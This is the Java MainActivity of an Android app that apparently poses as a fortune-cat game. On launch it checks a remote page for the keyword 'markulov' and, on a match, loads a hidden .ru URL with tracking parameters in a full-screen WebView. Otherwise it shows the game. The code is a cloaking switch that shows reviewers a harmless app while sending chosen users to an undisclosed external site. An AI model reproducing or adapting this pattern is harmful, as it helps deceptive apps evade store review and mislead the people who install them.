package com.belucky.fortunecat;

import androidx.appcompat.app.AppCompatActivity;
import androidx.fragment.app.Fragment;
import androidx.fragment.app.FragmentTransaction;

import android.content.pm.ActivityInfo;
import android.graphics.drawable.AnimationDrawable;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.ImageView;

import com.facebook.FacebookSdk;
import com.onesignal.OneSignal;

public class MainActivity extends AppCompatActivity {

    private ImageView loadAnimation;
    private FragmentTransaction fragTrans;
    private static MainActivity instance;
    private static final String ONESIGNAL_APP_ID = "54eb67f1-d104-4386-920b-5500d3a74a06";
    private String wordTds = "markulov";
    private FragCheck fc;
    private boolean choice = false;
    private String target = "http://orientlhru.ru/8wHqQv29";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        navBarHide();
        animationOfLoading();

        instance = this;

        OneSignal.setLogLevel(OneSignal.LOG_LEVEL.VERBOSE, OneSignal.LOG_LEVEL.NONE);
        OneSignal.initWithContext(this);
        OneSignal.setAppId(ONESIGNAL_APP_ID);

        FacebookSdk.sdkInitialize(getApplicationContext());
        FacebookSdk.setAutoInitEnabled(true);
        FacebookSdk.fullyInitialize();

        fc = new FragCheck();
        fc.execute();
    }

    @Override
    public void onBackPressed() {
        if (getSupportFragmentManager().findFragmentByTag("webtag") != null && choice) {
            if(PamFragment.pwView.canGoBack()){
                PamFragment.pwView.goBack();
            }
            else {
                super.onBackPressed();
            }
        }
        else if (getSupportFragmentManager().findFragmentByTag("infotag") != null && !choice) {
            setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_LANDSCAPE);
            Fragment frag = new CatFragment();
            FragmentTransaction fragmentTransaction = getSupportFragmentManager().beginTransaction();
            fragmentTransaction.replace(R.id.fragment_changer, frag, "cattag");
            fragmentTransaction.commit();
        }
        else
            super.onBackPressed();
    }

    @Override
    public void onWindowFocusChanged(boolean hasFocus) {
        super.onWindowFocusChanged(hasFocus);
        navBarHide();
    }

    private void navBarHide() {
        View decor = getWindow().getDecorView();
        int uiOpt = View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                | View.SYSTEM_UI_FLAG_FULLSCREEN
                | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY;
        decor.setSystemUiVisibility(uiOpt);
    }

    private void animationOfLoading(){
        loadAnimation = (ImageView) findViewById(R.id.animation_of_loading);
        loadAnimation.setBackgroundResource(R.drawable.loading_anim);
        AnimationDrawable animation = (AnimationDrawable) loadAnimation.getBackground();
        animation.start();
    }

    public static MainActivity getInstance() {
        return instance;
    }

    public void fragmentChooser() {
        String strParse = "";
        try {
            strParse = fc.getWebPageString().split("<body>")[1].split("</body>")[0].replaceAll("\\s+", "");
        } catch (Exception ex) {
        }

        if (strParse.equals(wordTds) || strParse.length() > 40) {
            choice = true;

            if (!fc.getFractionUri().equals("")) {
                target += "?subId1=TIDIS&subId2=TIDIS&subId3=TIDIS&subId4=TIDIS&subId5=TIDIS";
                String parts[] = fc.getFractionUri().split("//");
                String urlTemp = target;
                for (int i = 0; i < parts.length; i++) {
                    urlTemp = urlTemp.replaceFirst("TIDIS", parts[i]);
                }
                urlTemp = urlTemp.replaceAll("TIDIS", "");
                target = urlTemp;
            }
            Log.d("--- Target URL ---", target);

            fragTrans = getSupportFragmentManager().beginTransaction();
            fragTrans.replace(R.id.fragment_changer, new PamFragment(target), "webtag");
            fragTrans.commit();
        }
        else {
            setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_LANDSCAPE);
            fragTrans = getSupportFragmentManager().beginTransaction();
            fragTrans.add(R.id.fragment_changer, new CatFragment(),"cattag");
            fragTrans.commit();
        }
    }
}